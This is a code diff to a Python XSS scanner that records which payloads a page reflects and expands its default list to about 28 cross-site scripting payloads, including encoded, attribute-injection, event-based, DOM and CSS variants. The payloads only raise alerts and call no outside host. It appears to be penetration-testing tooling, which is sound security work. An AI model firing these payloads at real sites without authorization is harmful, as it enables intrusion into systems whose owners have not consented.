@@ -42,6 +42,7 @@ def scrape_form_fields(url):
 def test_payloads(url, payloads, method="GET", data=None):
     """Test payloads for XSS vulnerabilities."""
     vulnerable = False
+    vulnerable_payloads = []
     for payload in payloads:
         if method.upper() == "POST":
             for key in data.keys():
@@ -53,26 +54,34 @@ def test_payloads(url, payloads, method="GET", data=None):
         if payload in response.text:
             print(f"\n🚨 Vulnerable to XSS: {url} with payload: {payload}")
             vulnerable = True
-    return vulnerable
+            vulnerable_payloads.append(payload)
+    return vulnerable, vulnerable_payloads
 
 def scan_xss(url, payloads, results):
     print(f"🔍 Scanning URL: {url}")
     forms = scrape_form_fields(url)
     vulnerable = False
+    vulnerable_payloads = []
 
     print("\n🌐 Testing GET requests...")
-    vulnerable = test_payloads(url, payloads)
+    is_vulnerable, payloads_found = test_payloads(url, payloads)
+    vulnerable |= is_vulnerable
+    vulnerable_payloads.extend(payloads_found)
 
     for form in forms:
         print(f"\n📝 Testing form with action: {form['action']} and method: {form['method'].upper()}")
         action_url = url + form['action']
         if form['method'] == 'post':
-            vulnerable |= test_payloads(action_url, payloads, method="POST", data=form['fields'])
+            is_vulnerable, payloads_found = test_payloads(action_url, payloads, method="POST", data=form['fields'])
+            vulnerable |= is_vulnerable
+            vulnerable_payloads.extend(payloads_found)
 
     results.append({
         "url": url,
-        "vulnerable": vulnerable
+        "vulnerable": vulnerable,
+        "payloads": vulnerable_payloads if vulnerable else []
     })
+
     if not vulnerable:
         print("✔️ No XSS vulnerabilities found.")
 
@@ -125,9 +134,49 @@ def main():
         choice = input("👉 Choose an option: ")
         if choice == '1':
             payloads = [
-                "<script>alert('XSS')</script>",
-                "'\"><script>alert('XSS')</script>",
-                "<img src='x' onerror='alert(\"XSS\")'>",
+                # Basic Payloads
+    "<script>alert('XSS')</script>",
+    "'\"><script>alert('XSS')</script>",
+    "<img src='x' onerror='alert(\"XSS\")'>",
+    "<svg/onload=alert('XSS')>",
+
+    # Encoded Variants
+    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
+    "<scr\0ipt>alert('XSS')</scr\0ipt>",
+    "<svg onload=\u0061lert('XSS')>",
+
+    # Attribute Injection
+    "' onfocus='alert(\"XSS\")' autofocus='true",
+    "'><svg/onload=alert('XSS')>",
+    "'><img src=x onerror=alert('XSS')>",
+    "' onmouseover='alert(\"XSS\")' style='position:absolute;top:0;left:0;width:100%;height:100%' ",
+
+    # Event-based Payloads
+    "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
+    "<body onload=alert('XSS')>",
+    "<video><source onerror='alert(\"XSS\")'></video>",
+    "<svg><animate attributeName='href' values='javascript:alert(\"XSS\")'></animate></svg>",
+
+    # Context-Specific
+    "';alert('XSS');//",
+    "\";alert('XSS');//",
+    "'+alert('XSS')+'",
+    "</script><script>alert('XSS')</script>",
+
+    # DOM-Based XSS
+    "javascript:alert(document.cookie)",
+    "data:text/html,<script>alert('XSS')</script>",
+    "#<script>alert('XSS')</script>",
+
+    # CSS Injection
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
+    "<style>body{background-image:url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>')}</style>",
+
+    # Other Variants
+    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+    "<details open ontoggle=alert('XSS')><summary>X</summary></details>"
+
             ]
             print("✅ Default payloads loaded.")
         elif choice == '2':
